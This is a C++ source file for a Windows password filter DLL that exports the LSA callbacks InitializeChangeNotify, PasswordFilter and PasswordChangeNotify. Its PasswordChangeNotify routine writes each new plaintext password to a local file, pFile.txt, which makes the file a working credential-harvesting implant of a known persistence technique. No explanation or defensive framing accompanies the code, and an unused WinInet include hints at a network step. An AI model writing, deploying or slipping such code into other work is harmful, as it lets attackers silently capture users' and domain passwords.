#include <windows.h>
#include <WinInet.h>
#include <ntsecapi.h>
#include <fstream>
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
    OutputDebugString("InitializeChangeNotify");
    return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) {
    OutputDebugString("PasswordFilter");
    return TRUE;
}

extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {

    HANDLE pFile = CreateFile("pFile.txt", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL, nullptr);

    if (pFile == INVALID_HANDLE_VALUE) {
        return STATUS_UNSUCCESSFUL;
    }
    DWORD byteswritten;

    if (const BOOL result = WriteFile(pFile, NewPassword->Buffer, NewPassword->Length, &byteswritten, nullptr); !result) {
        return STATUS_UNSUCCESSFUL;
    }

    CloseHandle(pFile);

	return 0;
}